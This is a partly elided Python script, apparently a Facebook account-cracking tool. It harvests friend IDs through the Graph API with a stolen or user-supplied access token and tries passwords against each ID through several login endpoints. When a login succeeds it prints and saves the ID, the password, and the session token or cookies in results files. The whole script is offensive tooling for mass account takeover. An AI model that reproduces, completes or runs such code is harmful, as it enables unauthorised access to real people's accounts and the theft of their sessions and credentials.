...
def logo():
	...
	print('''\x1b[1;97m__     ______ ____      _    ____ _  __  
\x1b[1;97m\ \   / / ___|  _ \    / \  / ___| |/ /   |\x1b[1;96m® \x1b[1;97mAuthor\x1b[1;91m: \x1b[1;90mIvanXD
\x1b[1;97m \ \ / / |   | |_) |  / _ \| |   | ' /    |\x1b[1;96m® \x1b[1;97mYoutube \x1b[1;91m: \x1b[1;92mIvanYT
\x1b[1;97m  \ V /| |___|  _ <  / ___ \ |___| . \    |\x1b[1;96m® \x1b[1;97mGithub \x1b[1;91m: \x1b[1;97mVan-XD
\x1b[1;97m   \_/  \____|_| \_\/_/   \_\____|_|\_\   |\x1b[1;96m® \x1b[1;97mVersion \x1b[1;91m: \x1b[1;90m1.2
                         ''')
...
def menu():
	...
	try:
		...
		nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
        id = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["id"].lower()
	...
	logo()
	print("\n\033[1;96m[\033[1;93m+\033[1;96m]=========================[\033[1;93m+\033[1;96m]")
	print("\n\033[1;93m[\033[1;94m#\033[1;97m] Nama    : %s") % (nama)
	print("\033[1;93m[\033[1;94m#\033[1;97m] Id            : %s") % (id)
	print("\n\033[1;96m[\033[1;93m+\033[1;96m]=========================[\033[1;93m+\033[1;96m]")
	print("\033[1;96m      SELAMAT MENGGUNAKAN")
	...
	print("\033[1;93m[\033[1;94m03\033[1;97m] CRACK ID FROM PUBLIC POST\033[1;97m [ \033[1;91mEROR \033[1;97m]")

	print("\033[1;93m[\033[1;94m04\033[1;97m] MULTIPLE-ID's CRACK\033[1;93m [ \033[1;95mPRO \033[1;97m]")

	print("\033[1;93m[\033[1;94m05\033[1;97m] Check Crack Results")

	print("\033[1;93m[\033[1;94m06\033[1;97m] USER-AGENT SETTINGS\033[1;97m [ \033[1;95mPRO \033[1;97m]")
	
	print("\033[1;93m[\033[1;94m07\033[1;97m] Lapor Author")
	...
	if Ivan =="":
		...
		if cek =="":
			...
			print("\033[1;96m[\033[1;93m+\033[1;96m] Copy File Name  And Paste into Input")
	...
	elif Ivan == "6" or Ivan == "06":

		setting_ua()
		
	elif Ivan == "7" or Ivan == "07":
		
		os.system('xdg-open https://wa.me/6282337026312')
...
def publik():
	...
	try:
		...
		for i in requests.get("https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s"%(idt, token)).json()["friends"]["data"]:
...
def massal():
	...
	try:
		...
		tanya_Total = int(input("\033[1;96m[\033[1;94m+\033[1;96m] JUMLAH TARGET : "))
	...
	for t in range(tanya_Total):
		...
		try:
			...
			for i in requests.get("https://graph.facebook.com/%s?fields=friends&access_token=%s"%(idt, token)).json()["friends"]["data"]:
...
def method():
	...
	print("\n\033[1;93m[\033[1;94m?\033[1;97m] CHOOSE CRACKING METHODE")

	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mFAST \033[1;97m]")

	print("\033[1;93m[\033[1;94m2\033[1;97m] MBASIC\033[1;93m [ \033[1;95mNORMAL \033[1;97m]")

	print("\033[1;93m[\033[1;94m3\033[1;97m] FREE FACEBOOK\033[1;93m [ \033[1;95mNORMAL\033[1;97m]")
	
	print("\033[1;93m[\033[1;94m4\033[1;97m] MOBILE\033[1;93m [ \033[1;95mLAMBAT\033[1;97m]")
	...
	if method == "":
		...
		ask = raw_input("\033[1;96m[\033[1;94m!\033[1;97m] Apakah Kamu Ingin Menggunakan Pw Manual? y/t :")
		...
		ask = raw_input("\033[1;96m[\033[1;94m03\033[1;97m] Apakah Kamu Ingin Menggunakan Pw Manual? y/t : ")
...
def cek_ttl_cp(uid, pw):
	...
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;95m[HASIL-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
...
def bapi(user):
	...
	sys.stdout.write(
		...
		"\r\033[0;91m[\033[0;92mPROSES\033[0;91m]\033[0;92m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;94m[HASIL-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				...
				print("\r\033[0;95m[HASIL-CP] %s|%s\033[0;92m        "%(uid, pw))
...
def mbasic(user):
	...
	sys.stdout.write(
		...
		"\r\033[0;91m[\033[0;92mPROSES\033[0;92m]\033[0;93m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[HASIL-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))

				ok.append("%s|%s"%(uid, pw))

				open("OK/%s.txt"%(tIvan),"a").write(" + %s|%s\n"%(uid, pw))
				...
				print("\r\033[0;95m[HASIL-CP] %s|%s\033[0;96m        "%(uid, pw))
...
def mobile(user):
	...
	sys.stdout.write(
		...
		"\r\033[0;91m[\033[0;92mPROSES\033[0;93m]\033[0;95m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[HASIL-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[HASIL-CP] %s|%s\033[0;91m        "%(uid, pw))
...
def manual():
	...
	def main(user):
		...
		sys.stdout.write(
			...
			"\r\033[0;92m[\033[0;96mPROSES\033[0;92m]\033[0;96m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
		...
		try:
			...
			for pw in asu:
				...
				if "c_user" in ses.cookies.get_dict().keys():
					...
					open("CP/%s.txt"%(tIvan),"a").write(" + %s|%s\n"%(uid, pw))
